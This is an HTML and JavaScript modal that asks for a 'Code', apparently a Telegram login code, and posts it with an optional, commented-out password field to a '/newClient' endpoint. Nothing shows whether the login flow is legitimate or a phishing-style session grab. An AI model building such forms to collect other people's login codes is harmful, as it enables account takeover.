<div id="modal-notify" class="fixed inset-0 bg-black/50 flex items-center justify-center hidden z-50">
    <div class="bg-white rounded-lg shadow-2xl w-full max-w-md mx-4 transform transition-transform duration-200 scale-60">
        <!-- Заголовок -->
        <div class="flex justify-between flex-col p-4">
            <h3 id="modal-notify-name" class="text-lg font-semibold">Confirm Code</h3>
            <span id="modal-notify-error" class="text-xs"></span>
        </div>
        <div class="flex px-4 flex-col gap-3">
            <div id="modal-notify-input" class="input">
                <input id="tg_code" name="code" placeholder="Code" type="text">
            </div>
            <!--            <div class="input">-->
            <!--                <input id="tg_password" name="password" type="password" placeholder="Password">-->
            <!--            </div>-->
        </div>
        <div class="flex justify-end gap-2 p-4 ">
            <button
                    onclick="closeModal('modal-notify')"
                    class="btn-secondary"
            >
                Cancel
            </button>
            <button
                    class="btn-primary"
                    onclick="handleSendConfirm()"
            >
                Submit
            </button>

        </div>

    </div>
</div>

<script>

    function openModal(modalId) {
        console.log('modalId', modalId)
        const modal = document.getElementById(modalId);
        modal.classList.remove('hidden');
        setTimeout(() => {
            modal.querySelector('div').classList.remove('scale-60');
        }, 10);
    }

    function closeModal(modalId) {
        const modal = document.getElementById(modalId);
        modal.querySelector('div').classList.add('scale-60');
        setTimeout(() => {
            modal.classList.add('hidden');
        }, 150);
    }

    const handleSendConfirm = () => {
        const code = document.getElementById('tg_code')?.value
        const password = document.getElementById('tg_password')?.value

        const formData = {
            tg_code: code,
            tg_password: password,
        }

        fetch('/newClient', {
            method: "POST",
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        })
        closeModal('modal-notify');
    }

    document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') {
            closeModal('modal-notify');
        }
    });
</script>
